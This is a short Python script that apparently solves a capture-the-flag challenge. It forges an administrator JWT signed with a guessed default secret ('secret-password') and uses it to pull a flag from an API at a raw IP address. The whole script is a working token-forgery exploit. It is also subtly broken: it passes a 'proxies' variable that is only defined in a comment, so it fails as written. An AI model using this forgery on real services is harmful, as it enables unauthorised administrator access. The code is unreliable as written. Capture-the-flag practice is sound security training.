import requests
import os
import jwt
import json
from datetime import datetime, timedelta, timezone

SECRET = os.environ.get("JWT_SECRET", "secret-password")
payload = {
    "username": "admin",
    "email": "admin@trea.htb",
    "role": "administrator",
    "exp": datetime.now(timezone.utc) + timedelta(hours=1),
    "iat": datetime.now(timezone.utc),
}

token = jwt.encode(payload, SECRET, algorithm="HS256")
# proxies = {"http":"http://localhost:8080"} for burp redirect
url_flag= "http://154.57.164.72:41069/api/user?username=admin"

def readFlag():
    headers = {"Authorization":"Bearer " + token}
    req = requests.get(url_flag, headers=headers, proxies=proxies)
    return req.text

flag_obj = readFlag()
json_shit = json.loads(flag_obj)
json2str = json_shit["flag"]
print("A flag final eh",json2str)

